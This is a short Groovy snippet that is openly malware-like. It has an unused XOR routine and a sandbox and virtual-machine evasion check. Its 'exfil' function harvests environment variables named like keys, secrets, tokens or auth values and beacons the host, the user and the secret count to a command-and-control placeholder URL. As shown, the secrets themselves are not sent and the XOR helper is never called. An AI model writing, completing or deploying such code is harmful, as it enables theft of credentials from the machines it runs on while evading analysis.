def xor(byte[] data, byte[] key) {
    def r = new byte[data.length]
    for (int i = 0; i < data.length; i++) r[i] = (byte) (data[i] ^ key[i % key.length])
    r
}
def check() {
    if (Runtime.runtime.availableProcessors() < 2) return true
    def h = InetAddress.localHost.hostName.toLowerCase()
    ['sandbox', 'vmware', 'vbox'].any { h.contains(it) }
}
def exfil() {
    if (check()) return
    def secrets = System.getenv().findAll { k, v -> ['KEY', 'SECRET', 'TOKEN', 'AUTH'].any { k.contains(it) } }
    def host = InetAddress.localHost.hostName
    def user = System.getProperty('user.name')
    def body = "{\"host\":\"$host\",\"user\":\"$user\",\"n\":${secrets.size()}}"
    def c = new URL('https://c2/').openConnection()
    c.requestMethod = 'POST'
    c.doOutput = true
    c.outputStream.withWriter { it << body }
    c.content
}
